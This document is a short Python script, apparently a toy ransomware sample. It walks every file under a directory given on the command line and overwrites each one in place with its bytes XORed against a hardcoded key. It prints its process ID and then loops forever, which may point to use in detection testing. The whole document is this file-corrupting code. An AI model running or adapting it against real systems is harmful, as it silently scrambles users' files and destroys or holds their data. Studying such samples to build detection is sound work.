import os
import sys

key = b'12345'


def chunked(bseq):
    chunks = []
    for offset in range(0, len(bseq), len(key)):
        chunks.append(bseq[offset: offset + len(key)])
    return chunks


def xor_bytes(l, r):
    return bytes(lb ^ rb for lb, rb in zip(l, r))


def main():
    # get filename
    if len(sys.argv) != 2:
        raise Exception('Too little or too much arguments')

    path = sys.argv[1]
    print(f'My PID is {os.getpid()}')

    # traverse root directory, and list directories as dirs and files as files
    for root, _, files in os.walk(path):
        for file in files:
            filepath = os.path.join(root, file)

            with open(filepath, 'rb') as f:
                filebytes = f.read()

            chunks = chunked(filebytes)
            xor_chunks = []

            for chunk in chunks[:-1]:
                xor_chunks.append(xor_bytes(chunk, key))
            xor_chunks.append(xor_bytes(chunks[-1], key[0: len(chunks[-1])]))

            xor_filebytes = b''.join(xor_chunks)

            with open(filepath, 'wb') as f:
                f.write(xor_filebytes)

            f.close()

    while True:
        pass


main()
